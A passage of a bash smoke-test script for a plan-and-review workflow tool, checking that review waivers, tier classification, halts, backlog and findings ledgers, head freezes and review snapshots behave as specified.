(cd "$T47" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1) || true
cp "$T47S/checkpoint.json" "$T47S/cp.bak"
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["epoch"]=s.get("epoch",0)+1; s["tiers"]["1"]["epoch"]=s["epoch"]; json.dump(s, open(p,"w"))' "$T47S/checkpoint.json"
expect_refusal "a waiver from another epoch" "requested changes" vc "$T47" complete 1 ok
cp "$T47S/cp.bak" "$T47S/checkpoint.json"
python3 -c 'import json,sys; p=sys.argv[1]; s=json.load(open(p)); s["reviews"]["1"]["attempt"]+=1; json.dump(s, open(p,"w"))' "$T47S/checkpoint.json"
expect_refusal "a waiver from an earlier attempt" "requested changes" vc "$T47" complete 1 ok
cp "$T47S/cp.bak" "$T47S/checkpoint.json"
O47="$(vc "$T47" complete 1 ok 2>&1)" || fail "complete refused a waived head with a green gate: $O47"
has 'recorded as waived, not approved' "$O47" && python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); c=s["completes"][-1]; w=s["operator_overrides"][c["waiver"]]
assert c["review"]=="waived" and w["kind"]=="review_waiver" and w["sha"]==c["head"] and w["reply"].startswith("waive 1") and w["residual_risk"]
assert not any(x["verdict"]=="APPROVE" for x in s["reviews"]["1"]["records"])' "$T47S/checkpoint.json" || fail "the waived completion was not recorded as waived (or an APPROVE was fabricated)"
# Tier C: a waiver covers the adversarial REQUEST_CHANGES but never G12.
T47C="$SMOKE_TMP/t47c"; TW="$(cal_run "$T47C" '- [ ] **Phase 1.1** [docs][tier:c] a\n  - Acceptance: true\n')" || fail "init for check 47 (Tier C) failed"
WC="$(wcommit "$TW" c1 a.md)"; (cd "$T47C" && "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
vc "$T47C" review 1 "$WC" APPROVE >/dev/null; vc "$T47C" review 1 "$WC" REQUEST_CHANGES adv --role adversarial >/dev/null
vc "$T47C" waive 1 "$WC" "waive 1" "refutation needs a planted file" >/dev/null || fail "Tier C waiver refused"
(cd "$T47C" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || true
expect_refusal "a waiver that skips G12 on Tier C" "G12" vc "$T47C" complete 1 ok
vc "$T47C" approve 1 "$WC" "approve G12 1" >/dev/null
vc "$T47C" complete 1 ok >/dev/null 2>&1 || fail "a waived, G12-approved Tier C head did not complete"
# Provenance mode: ledgered as human_gate; lifts a REQUEST_CHANGES record, never an UNPARSED one.
T47P="$SMOKE_TMP/t47p"; TW="$(cal_run "$T47P" "$TWO")" || fail "init for check 47 (provenance) failed"
T47PS="$(st "$T47P" plans/v-plan.md)"; mkdir -p "$T47PS/dispatch/reviews-raw" "$SMOKE_TMP/fd47/scripts"
printf '#!/bin/sh\nexit 0\n' >"$SMOKE_TMP/fd47/scripts/route.sh"; printf '#!/bin/sh\necho "$*" >>"$(dirname "$0")/calls.log"\nexit 0\n' >"$SMOKE_TMP/fd47/scripts/ledger.sh"; chmod +x "$SMOKE_TMP/fd47/scripts/"*.sh
WP="$(wcommit "$TW" p1 a.md)"
praw() { printf '{"record_id": "rec-%s-0001", "line": 1, "head_sha": "%s", "role": "%s", "verdict": "%s", "provider": "claude-session"}' "$1" "$WP" "$2" "$3" >"$T47PS/dispatch/reviews-raw/$1.json"; }
praw rc1 reviewer REQUEST_CHANGES
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md review 1 "$WP" REQUEST_CHANGES rv --agent-id rc1 >/dev/null) || fail "the provenance REQUEST_CHANGES record was refused"
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md waive 1 "$WP" "waive 1" "edge needs tampering" >/dev/null) || fail "the provenance waiver was refused"
grep -q '^append human_gate .*"gate": "review-waiver".*--source cli --head '"$WP" "$SMOKE_TMP/fd47/scripts/calls.log" || fail "the waiver was not ledgered as a human_gate row"
(cd "$T47P" && APEX_GATE_TEST=true "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null) || true
praw unp reviewer UNPARSED
expect_refusal "a waiver lifting an UNPARSED record" "did not approve" indir "$T47P" APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok
rm -f "$T47PS/dispatch/reviews-raw/unp.json"
(cd "$T47P" && APEX_DISPATCH_ROOT="$SMOKE_TMP/fd47" "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "a waived provenance REQUEST_CHANGES still blocked complete"
ok "waiver: literal reply + named risk; bound to SHA, epoch and attempt; gate and G12 still required; recorded as waived; ledgered and REQUEST_CHANGES-only in provenance mode"

# 48. Progress-aware halts: a failure is a stall unless --progress is given AND
#     the head moved; HALT at APEX_ERROR_BUDGET stalls or APEX_ATTEMPT_CAP
#     consecutive failures, naming the counter; ESCALATE unchanged.
T48="$SMOKE_TMP/t48"; TW="$(cal_run "$T48" "$TWO")" || fail "init for check 48 failed"
for i in 1 2 3 4 5; do wcommit "$TW" "p$i" a.md >/dev/null; O48="$(vc "$T48" fail 1 "f$i" --progress "closed finding $i" 2>&1)"; done
has 'this one: progress' "$O48" && has '^ESCALATE:' "$O48" && ! has 'HALTED' "$O48" || fail "five progressing failures halted (or did not escalate): $O48"
wcommit "$TW" p6 a.md >/dev/null; O48="$(vc "$T48" fail 1 f6 --progress "closed finding 6" 2>&1)"
has 'HALTED: attempt cap reached: 6 consecutive failures (APEX_ATTEMPT_CAP=6)' "$O48" || fail "the attempt cap did not halt at 6: $O48"
vc "$T48" resume "human looked" >/dev/null
O48="$(vc "$T48" fail 1 g1 --progress "claimed" 2>&1)"; has 'this one: stall (--progress given but the head did not move' "$O48" || fail "progress without a moved head was not a stall: $O48"
vc "$T48" fail 1 g2 >/dev/null; O48="$(vc "$T48" fail 1 g3 2>&1)"
has 'HALTED: error budget exhausted: 3 stalled failures (APEX_ERROR_BUDGET=3)' "$O48" || fail "three stalls did not halt: $O48"
vc "$T48" resume "again" >/dev/null
python3 -c 'import json,sys; s=json.load(open(sys.argv[1])); assert s["consecutive_failures"]==0 and s["consecutive_stalls"]==0' "$(st "$T48" plans/v-plan.md)/checkpoint.json" || fail "resume did not reset both counters"
expect_refusal "fail with an unknown option" "unknown fail option" vc "$T48" fail 1 x --progres y
ok "halts: stalls vs progress (claim + moved head), attempt cap, counter named; resume resets both"

# 49. Hardening backlog: add / list / done / count, one line per finding, one
#     section per plan; the brief counts open items; land.sh treats BACKLOG.md
#     exactly like the lessons ledger (exempt in the base checkout, the base's copy lands).
T49="$SMOKE_TMP/t49"; mkdir -p "$T49/.claude/apex-scope-loop"; printf '# backlog\n' >"$T49/.claude/apex-scope-loop/BACKLOG.md"
TW="$(cal_run "$T49" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n')" || fail "init for check 49 failed"
BL="$T49/.claude/apex-scope-loop/BACKLOG.md"; BS="$EX/backlog.sh"
(cd "$T49" && "$BS" plans/v-plan.md add 1 $'cache dir edge\n## Plan: injected' --from adversarial >/dev/null && "$BS" plans/v-plan.md add 1 "second" >/dev/null) || fail "backlog add failed"
expect_refusal "a backlog item for a non-task line" "not a task" indir "$T49" "$BS" plans/v-plan.md add 2 "x"
grep -c '^## Plan: ' "$BL" | grep -qx 1 && grep -q '^- \[ \] B-001 · .* · line 1 (Phase 1.1) · from adversarial — cache dir edge ## Plan: injected$' "$BL" || fail "backlog items are not one line each in one plan section: $(cat "$BL")"
has '^BACKLOG: 2 open for this plan' "$(brief "$T49" plans/v-plan.md)" || fail "the brief did not count the open backlog items"
(cd "$T49" && "$BS" plans/v-plan.md done B-001 --now >/dev/null) || fail "backlog done failed"
expect_refusal "done for an unknown item" "is not an item" indir "$T49" "$BS" plans/v-plan.md done B-009 --now
O49="$(cd "$T49" && "$BS" plans/v-plan.md list)"; has '^BACKLOG: 1 open' "$O49" && has 'B-002' "$O49" && ! has 'B-001' "$O49" || fail "backlog list is wrong: $O49"
has 'B-001' "$(cd "$T49" && "$BS" plans/v-plan.md list --all)" || fail "backlog list --all hid a done item"
# land: the run branch also edits BACKLOG.md; the base's (dirty, uncommitted) copy is what lands.
echo "run copy" >"$TW/.claude/apex-scope-loop/BACKLOG.md"; echo doc >"$TW/n.md"; git -C "$TW" add -A; git -C "$TW" commit -qm work
(cd "$T49" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "the backlog land fixture could not complete"
(cd "$T49" && "$BS" plans/v-plan.md add 1 "after completion" >/dev/null)
O49="$(cd "$T49" && "$EX/land.sh" plans/v-plan.md 2>&1)" || fail "land refused with a dirty base BACKLOG.md: $O49"
git -C "$T49" show HEAD:.claude/apex-scope-loop/BACKLOG.md | grep -q 'after completion' && ! git -C "$T49" show HEAD:.claude/apex-scope-loop/BACKLOG.md | grep -q 'run copy' \
  && git -C "$T49" show HEAD:n.md >/dev/null 2>&1 || fail "land did not take the base's BACKLOG.md (or lost the run's code)"
grep -q 'BACKLOG_REL' "$EX/land.sh" && grep -q 'BACKLOG.md' "$EX/_lib.sh" "$EX/risk-tier.sh" "$EX/checkpoint.sh" || fail "BACKLOG.md is not treated like the lessons ledger everywhere"
ok "backlog: add/list/done/count, one line per item, one section per plan, counted in the brief; land takes the base's copy"

# 50. Classifier calibration: content signals are ignored in test/fixture/smoke/
#     example/docs files (named in a REASON), never in source files; their paths
#     still classify; [tier:a]/[tier:b] decide over B and content signals, never
#     over Tier C paths or [tier:c].
rtc() { # rtc TAGS FILE CONTENT [FILE CONTENT...] — risk-tier output for a fresh one-task run
  local d w; d="$(mktemp -d "$SMOKE_TMP/rtc.XXXXXX")"; w="$(cal_run "$d" "- [ ] **Phase 1.1** $1 a\n  - Acceptance: true\n")" || { echo init-failed; return 0; }
  shift; while [ $# -ge 2 ]; do mkdir -p "$w/$(dirname "$1")"; printf '%s\n' "$2" >"$w/$1"; shift 2; done
  git -C "$w" add -A; git -C "$w" commit -qm t; (cd "$d" && "$EX/risk-tier.sh" plans/v-plan.md 1 --no-record 2>&1)
}
O50="$(rtc '[docs]' tests/fixtures/pay.py 'import stripe  # amount_cents' docs/guide.md 'price: 10' scripts/smoke.sh 'echo stripe' src/x.test.ts 'charge(1)')"
has '^TIER: A' "$O50" && has 'content signals ignored in test/fixture/smoke/example/docs file: tests/fixtures/pay.py' "$O50" || fail "fixture/docs/smoke content raised the tier: $O50"
for c in 'src/pay_util.py|import stripe' 'src/attestation.py|import stripe' 'testsuite/pay.py|charge(1)'; do
  has '^TIER: C' "$(rtc '[docs]' tests/ok.py 'price' "${c%%|*}" "${c#*|}")" || fail "a content signal in ${c%%|*} was ignored"
done
has '^TIER: C' "$(rtc '[docs]' tests/auth/test_login.py 'x')" || fail "an auth path under tests/ was not Tier C"
O50="$(rtc '[docs][tier:a reason="mechanical move"]' src/x.py 'charge(1)' src/api/a.py 1 src/api/b.py 2 src/api/c.py 3 src/api/d.py 4 src/api/e.py 5 src/api/f.py 6 src/api/g.py 7)"
has '^TIER: A' "$O50" && has "overridden by the task's \[tier:a reason=\"mechanical move\"\]" "$O50" && has 'reason="mechanical move"\] decides' "$O50" || fail "[tier:a] did not decide over content and B signals (or hid them): $O50"
has '^TIER: B' "$(rtc '[docs][tier:b reason="wide but mechanical"]' notes.txt x)" || fail "[tier:b reason=...] did not set Tier B"
has '^TIER: C' "$(rtc '[docs][tier:a reason="r"]' src/auth/session.py x)" || fail "[tier:a] overrode a Tier C path signal"
has '^TIER: C' "$(rtc '[docs][tier:a reason="r"][tier:c]' notes.txt x)" || fail "[tier:a] overrode [tier:c]"
O50="$(rtc '[docs][tier:a]' src/x.py 'charge(1)')"
has '^TIER: C' "$O50" && has 'bare \[tier:a\]/\[tier:b\] tag has no effect' "$O50" || fail "a bare [tier:a] (no reason) overrode a content signal: $O50"
has '^TIER: B' "$(rtc '[docs]' a1 1 a2 2 a3 3 a4 4 a5 5 a6 6 a7 7)" || fail "breadth alone is not Tier B"
ok "classifier: fixture/docs/smoke content ignored and named, source content and exempt-dir paths still classify; [tier:a]/[tier:b] decide over B and content, never over C paths or [tier:c]"

# --- ADR-0004 addendum (downstream fork feedback): checks 51-59 ---------------
FS="$EX/findings.sh"
fx2() { local d="$1"; shift; ( cd "$d" && "$@" ); }

# 51. (A) Carried findings per task: one entry per defect (class + file:line),
#     residuals go to the backlog and never count as open, close/reopen, the
#     brief prints the file and the open count.
T51="$SMOKE_TMP/t51"; TW="$(cal_run "$T51" "$TWO")" || fail "init for check 51 failed"
F1="$(wcommit "$TW" f1 a.md)"; F2="$(wcommit "$TW" f2 a.md)"
fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F1" "cache not invalidated" >/dev/null || fail "findings add failed"
has 'DUPLICATE' "$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F2" "Cache  not invalidated.")" || fail "a repeated defect was not deduplicated"
O51="$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity non-blocking --class symlink --at src/b.py:9 --sha "$F2" "planted symlink" --from adversarial)"
has 'F-002 residual' "$O51" && has 'BACKLOG: B-001 added' "$O51" || fail "a non-blocking finding was not a residual copied to the backlog: $O51"
expect_refusal "a finding with a bad severity" "blocking or non-blocking" fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity high --class x --at a:1 --sha "$F2" "m"
expect_refusal "a finding without file:line" "--at FILE:LINE" fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class x --sha "$F2" "m"
B51="$(brief "$T51" plans/v-plan.md)"
has "^FINDINGS: .*/findings/L1.json (1 open, 1 residual, 0 closed)" "$B51" || fail "the brief did not print the findings file and counts"
python3 -c 'import json,sys; d=json.load(open(sys.argv[1])); x=d["items"][0]; assert len(d["items"])==2 and x["rounds"]==[sys.argv[2], sys.argv[3]]' "$(fx2 "$T51" "$FS" plans/v-plan.md path 1)" "$F1" "$F2" || fail "a defect was counted twice"
fx2 "$T51" "$FS" plans/v-plan.md close 1 F-001 --reason "test_cache added" >/dev/null
has '^FINDINGS: .*(0 open, 1 residual, 1 closed)' "$(fx2 "$T51" "$FS" plans/v-plan.md list 1 --open)" || fail "close did not close the finding"
has 'DUPLICATE.*-> open' "$(fx2 "$T51" "$FS" plans/v-plan.md add 1 --severity blocking --class stale-cache --at src/a.py:3 --sha "$F2" "cache not invalidated")" || fail "a closed defect found again was not re-opened as the same entry"
ok "findings: one entry per defect, residuals to the backlog, close/reopen, FINDINGS in the brief"

# 52. (B) The cap counts only rounds that requested changes; Review: cap=<n>
#     overrides it; the directive is validated and what it changed is recorded;
#     Tier C keeps >= 3 lenses and the adversarial pass.
T52="$SMOKE_TMP/t52"; TW="$(cal_run "$T52" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Review: cap=1 adversarial=no\n- [ ] **Phase 1.2** [docs][tier:c] c\n  - Acceptance: true\n  - Review: lenses=correctness,security adversarial=no\n')" || fail "init for check 52 failed"
for i in 1 2 3 4; do vc "$T52" review 1 "$(wcommit "$TW" "ap$i" a.md)" APPROVE >/dev/null || fail "an approving round $i used the cap"; done
vc "$T52" review 1 "$(wcommit "$TW" rc1 a.md)" REQUEST_CHANGES >/dev/null || fail "the first blocking round was refused"
expect_refusal "a second blocking round over Review: cap=1" "REVIEW_CAP: 1 review rounds requested changes" vc "$T52" review 1 "$(wcommit "$TW" rc2 a.md)" REQUEST_CHANGES
has '^REVIEW_CAP: 1 ' "$(brief "$T52" plans/v-plan.md)" || fail "the brief did not show the directive's cap"
vc "$T52" fail 1 "cap" >/dev/null
H52="$(git -C "$TW" rev-parse HEAD)"; vc "$T52" review 1 "$H52" APPROVE >/dev/null
(cd "$T52" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null)
has 'Review: directive at line 1: .*"applied": \["adversarial=no", "cap=1"\]' "$(vc "$T52" complete 1 ok 2>&1)" || fail "complete did not report what the Review: directive changed"
python3 -c 'import json,sys; c=json.load(open(sys.argv[1]))["completes"][-1]; assert c["review_directive"]["applied"]==["adversarial=no","cap=1"], c' "$(st "$T52" plans/v-plan.md)/checkpoint.json" || fail "the directive's effect was not recorded in the completion"
HC="$(wcommit "$TW" c1 c.md)"; vc "$T52" review 4 "$HC" APPROVE >/dev/null
(cd "$T52" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 4 >/dev/null); vc "$T52" approve 4 "$HC" "approve G12 4" >/dev/null
expect_refusal "adversarial=no on Tier C" "adversarial review" vc "$T52" complete 4 ok
vc "$T52" review 4 "$HC" APPROVE adv --role adversarial >/dev/null
has '"ignored": \["lenses=correctness,security (Tier C keeps at least 3 distinct lenses' "$(vc "$T52" complete 4 ok 2>&1)" || fail "a Tier C directive below 3 lenses was not reported as ignored"
printf -- '- [ ] **Phase 1.1** a\n  - Acceptance: true\n  - Review: cap=0 lenses=money,ux adversarial=maybe depth=9\n' >"$SMOKE_TMP/t52-bad.md"
O52="$(python3 "$EX/planlib.py" validate "$SMOKE_TMP/t52-bad.md" 2>&1 || true)"
for e in 'cap=0 must be 1-9' "lenses=money,ux must be" 'adversarial=maybe must be' "Review key 'depth' unknown"; do has "$e" "$O52" || fail "Review: directive validation missed: $e"; done
ok "review cap: only blocking rounds count; Review: cap/lenses/adversarial validated, applied for A/B, recorded; Tier C keeps 3+ lenses and the adversarial pass"

# 53. (C) Freeze the head during review: only the current head can be frozen;
#     review of another SHA is refused while frozen; the freeze lifts when the
#     round's verdicts are in, or on unfreeze; the brief shows it.
T53="$SMOKE_TMP/t53"; TW="$(cal_run "$T53" "$TWO")" || fail "init for check 53 failed"
Z1="$(wcommit "$TW" z1 a.md)"; Z2="$(wcommit "$TW" z2 a.md)"
expect_refusal "freezing a SHA that is not the head" "not the worktree head" vc "$T53" freeze 1 "$Z1"
vc "$T53" freeze 1 "$Z2" --reviewers 2 >/dev/null || fail "freeze of the head failed"
has "^FROZEN: $Z2 (0/2" "$(brief "$T53" plans/v-plan.md)" || fail "the brief did not show the freeze"
Z3="$(wcommit "$TW" z3 a.md)"
expect_refusal "a review of another SHA while frozen" "frozen at ${Z2:0:12}" vc "$T53" review 1 "$Z3" APPROVE
vc "$T53" review 1 "$Z2" REQUEST_CHANGES >/dev/null; has '^FREEZE: lifted' "$(vc "$T53" review 1 "$Z2" REQUEST_CHANGES r2 --role lens:money 2>&1)" || fail "the freeze did not lift when the round's verdicts were in"
vc "$T53" review 1 "$Z3" APPROVE >/dev/null || fail "a review after the freeze lifted was refused"
Z4="$(wcommit "$TW" z4 a.md)"; vc "$T53" freeze 1 "$Z4" >/dev/null; vc "$T53" unfreeze 1 >/dev/null
vc "$T53" review 1 "$(wcommit "$TW" z5 a.md)" APPROVE >/dev/null || fail "unfreeze did not lift the freeze"
grep -q 'one batch' "$PLUGIN_ROOT/commands/iterate.md" || fail "iterate.md does not say fixes land as one batch after the round"
ok "freeze: head only, other SHAs refused, lifts with the round's verdicts or unfreeze, shown in the brief"

# 54. (D) One read-only review snapshot per commit: read-tree + checkout-index
#     (export-ignore cannot drop files), setup runs once, reuse, failed setup
#     leaves nothing, pruned at complete.
T54="$SMOKE_TMP/t54"; TW="$(cal_run "$T54" "$TWO")" || fail "init for check 54 failed"
printf 'hidden.txt export-ignore\n' >"$TW/.gitattributes"; echo s >"$TW/hidden.txt"; git -C "$TW" add -A; git -C "$TW" commit -qm ei
SN="$EX/snapshot.sh"; CNT="$SMOKE_TMP/t54-setup-count"
O54="$(cd "$T54" && APEX_SNAPSHOT_SETUP="echo x >>'$CNT'; echo built >build.out" "$SN" plans/v-plan.md)" || fail "snapshot failed: $O54"
SP="$(sed -n 's/^REVIEW_SNAPSHOT: //p' <<<"$O54")"
[ -f "$SP/hidden.txt" ] && [ -f "$SP/build.out" ] && python3 -c 'import os,sys; sys.exit(any(os.stat(p).st_mode & 0o222 for p in sys.argv[1:]))' "$SP" "$SP/hidden.txt" || fail "the snapshot dropped an export-ignore file, missed the setup output, or is writable"
has 'SNAPSHOT: reused' "$(cd "$T54" && APEX_SNAPSHOT_SETUP="echo x >>'$CNT'" "$SN" plans/v-plan.md)" && [ "$(wc -l <"$CNT" | tr -d ' ')" = 1 ] || fail "the snapshot was not reused (setup ran twice)"
wcommit "$TW" more a.md >/dev/null
expect_refusal "a snapshot whose setup fails" "APEX_SNAPSHOT_SETUP failed" indir "$T54" APEX_SNAPSHOT_SETUP=false "$SN" plans/v-plan.md
[ ! -d "$(dirname "$SP")/$(git -C "$TW" rev-parse HEAD)" ] || fail "a failed setup left a snapshot behind"
(cd "$T54" && "$SN" plans/v-plan.md >/dev/null && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null \
  && "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete failed in check 54"
[ -z "$(ls -A "$(dirname "$SP")" 2>/dev/null | grep -v '^\.tmp' || true)" ] || fail "complete did not prune the review snapshots"
ok "snapshot: read-tree + checkout-index (export-ignore kept), read-only, setup once, reused, failed setup leaves nothing, pruned at complete"

# 55. (E) Tier override needs its reason and records it; a reviewer raise needs a
#     reason and is recorded; size alone is Tier B (one reviewer, no G12).
T55="$SMOKE_TMP/t55"; TW="$(cal_run "$T55" '- [ ] **Phase 1.1** [docs][tier:a reason="vendored generated code"] a\n  - Acceptance: true\n- [ ] **Phase 1.2** [docs] b\n  - Acceptance: true\n')" || fail "init for check 55 failed"
wcommit "$TW" 'price = 1' util.py >/dev/null
has '^TIER: A' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1)" || fail "[tier:a reason=...] did not override a content signal"
python3 -c 'import json,sys; t=json.load(open(sys.argv[1]))["tiers"]["1"]; assert t["override"]=={"tier":"A","reason":"vendored generated code"}, t' "$(st "$T55" plans/v-plan.md)/checkpoint.json" || fail "the override's reason was not recorded"
expect_refusal "a raise without a reason" "needs --reason" indir "$T55" "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C
has '^TIER: C' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1 --raise C --reason "reviewer: util.py computes prices")" || fail "--raise did not raise"
has '^TIER: C' "$(cd "$T55" && "$EX/risk-tier.sh" plans/v-plan.md 1)" && python3 -c 'import json,sys; t=json.load(open(sys.argv[1]))["tiers"]["1"]; assert t["raised"][0]["reason"].startswith("reviewer:"), t' "$(st "$T55" plans/v-plan.md)/checkpoint.json" \
  || fail "a raised tier did not stick with its reason"
T55B="$SMOKE_TMP/t55b"; TW="$(cal_run "$T55B" "$TWO")" || fail "init for check 55 (size) failed"
for i in $(seq 1 9); do seq 1 30 >"$TW/f$i.txt"; done; git -C "$TW" add -A; git -C "$TW" commit -qm big
O55="$(cd "$T55B" && "$EX/risk-tier.sh" plans/v-plan.md 1)"; has '^TIER: B' "$O55" && has 'REQUIRES: full six-lens independent review' "$O55" || fail "a large plain diff was not exactly Tier B: $O55"
(cd "$T55B" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$CP" plans/v-plan.md review 1 "$(git -C "$TW" rev-parse HEAD)" APPROVE >/dev/null && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) \
  || fail "a size-only Tier B task needed more than one reviewer or a G12"
ok "tier override: reason required and recorded; --raise needs and records a reason; size alone stays Tier B (one reviewer, no G12)"

# 56. (F) Threats: (inline and as sub-items) reach the brief; the builder
#     handback template and the working agreement ship; templates name a fallback.
T56="$SMOKE_TMP/t56"; TW="$(cal_run "$T56" '- [ ] **Phase 1.1** [docs] a\n  - Acceptance: true\n  - Threats: 1) stale cache; 2) crash mid-write\n    - untracked .gitignore hides siblings\n')" || fail "init for check 56 failed"
B56="$(brief "$T56" plans/v-plan.md)"
has '^THREATS: 3$' "$B56" && has '^  2\. crash mid-write$' "$B56" && has '^  3\. untracked .gitignore hides siblings$' "$B56" || fail "the Threats: list did not reach the brief: $(grep -A3 THREATS <<<"$B56")"
HB="$PLUGIN_ROOT/skills/apex-execute/resources/templates/builder-handback.md"
[ -f "$HB" ] && grep -q 'Failing-first test' "$HB" && grep -q 'Mutant' "$HB" && grep -q 'real files' "$HB" || fail "the builder handback template is missing or incomplete"
grep -q 'never obfuscate around it' "$PLUGIN_ROOT/commands/iterate.md" && grep -q 'builder-handback.md' "$PLUGIN_ROOT/commands/iterate.md" || fail "iterate.md does not hand builders the threat list, template and working agreement"
grep -q 'drop the feature' "$PLUGIN_ROOT/skills/apex-plan/resources/templates/profiles/generic/plan-template.md" || fail "the plan template does not ask hand-parsing tasks for a fallback"
ok "threats: inline and sub-item lists in the brief; builder handback template, working agreement, parser fallback"

# 57. (G) Known defect classes: lessons for the task's tags plus closed finding
#     classes; a class closed in two tasks suggests the exact lessons.sh add.
T57="$SMOKE_TMP/t57"; TW="$(cal_run "$T57" "$TWO")" || fail "init for check 57 failed"
G1="$(wcommit "$TW" g1 a.md)"
for l in 1 3; do fx2 "$T57" "$FS" plans/v-plan.md add "$l" --severity blocking --class ignored-hides --at "x$l.py:1" --sha "$G1" "m" >/dev/null; fx2 "$T57" "$FS" plans/v-plan.md close "$l" F-001 >/dev/null; done
(cd "$T57" && "$EX/lessons.sh" plans/v-plan.md add "pytest cache dirty" "w" "r" "f" "docs" >/dev/null)
B57="$(brief "$T57" plans/v-plan.md)"
has '^KNOWN_DEFECT_CLASSES: L-001:pytest-cache-dirty, ignored-hides$' "$B57" || fail "KNOWN_DEFECT_CLASSES is wrong: $(grep KNOWN <<<"$B57")"
has '^LESSON_SUGGESTED: lessons.sh "plans/v-plan.md" add "ignored-hides" "finding class ignored-hides recurred in the tasks at lines 1, 3"' "$B57" || fail "no lessons.sh suggestion for a class seen in two tasks"
(cd "$T57" && "$EX/lessons.sh" plans/v-plan.md add "ignored hides" "w" "r" "f" "docs" >/dev/null)
! has '^LESSON_SUGGESTED:' "$(brief "$T57" plans/v-plan.md)" || fail "a lesson was suggested again after it was filed"
ok "known defect classes from lessons and closed findings; LESSON_SUGGESTED once per unfiled recurring class"

# 58. (H) Script confusions: SINCE = TASK_BASE in the brief; every script works
#     from the plan worktree with base-relative, absolute and worktree-copy plan
#     paths (a worktree copy acts on the base checkout's plan); complete names
#     the missing prerequisite and the exact command; npm steps only from
#     scripts that exist.
T58="$SMOKE_TMP/t58"; TW="$(cal_run "$T58" "$TWO")" || fail "init for check 58 failed"
B58="$(brief "$T58" plans/v-plan.md)"; [ "$(sed -n 's/^SINCE: //p' <<<"$B58")" = "$(sed -n 's/^TASK_BASE: //p' <<<"$B58")" ] || fail "SINCE is not TASK_BASE"
H58="$(wcommit "$TW" h1 a.md)"
for P in "$T58/plans/v-plan.md" plans/v-plan.md; do
  for c in "$EX/iterate.sh $P" "$EX/risk-tier.sh $P 1 --no-record" "$EX/green-gate.sh $P check" "$FS $P list 1" "$EX/backlog.sh $P count" "$EX/status.sh $P" "$EX/snapshot.sh $P" "$EX/lessons.sh $P recall docs"; do
    O58="$(cd "$TW" && $c 2>&1 || true)"
    ! has 'not initialized\|plan not found' "$O58" || fail "from the plan worktree, '$c' said: $(head -2 <<<"$O58")"
  done
done
rm -f "$(st "$T58" plans/v-plan.md)/gate/last.json"
O58="$(cd "$T58" && "$CP" plans/v-plan.md complete 1 ok 2>&1 || true)"
has "run risk-tier.sh for line 1 first: risk-tier.sh plans/v-plan.md 1 --since" "$O58" && has "green-gate.sh plans/v-plan.md check" "$O58" && has "checkpoint.sh plans/v-plan.md review 1 $H58" "$O58" \
  || fail "complete did not name the missing prerequisites with exact commands: $O58"
(cd "$TW" && "$EX/green-gate.sh" plans/v-plan.md check >/dev/null 2>&1; "$EX/risk-tier.sh" plans/v-plan.md 1 >/dev/null && "$CP" plans/v-plan.md review 1 "$H58" APPROVE >/dev/null \
  && "$CP" plans/v-plan.md complete 1 ok >/dev/null 2>&1) || fail "complete from the plan worktree with its copy of the plan failed"
grep -q '^- \[x\] \*\*Phase 1.1' "$T58/plans/v-plan.md" && grep -q '^- \[ \] \*\*Phase 1.1' "$TW/plans/v-plan.md" || fail "complete from the worktree did not tick the base checkout's plan"
T58N="$SMOKE_TMP/t58n"; TW="$(cal_run "$T58N" "$TWO")" || fail "init for the npm check failed"
printf '{"scripts": {}}\n' >"$TW/package.json"; git -C "$TW" add -A; git -C "$TW" commit -qm pkg
O58="$(cd "$T58N" && "$EX/green-gate.sh" plans/v-plan.md check 2>&1 || true)"
has 'GATE_STEP: typecheck SKIPPED' "$O58" && ! has 'npm run' "$O58" || fail "green-gate invented an npm script: $O58"
ok "script confusions: SINCE = TASK_BASE; worktree cwd and plan paths resolve; complete names exact prerequisites; npm steps only from package.json scripts"

# 59. (J) Measurement: status.sh --review-metrics reports rounds, blocking rounds,
#     attempts and minutes per round per task; ADR-0004 states how calibration is judged.
T59="$SMOKE_TMP/t59"; TW="$(cal_run "$T59" "$TWO")" || fail "init for check 59 failed"
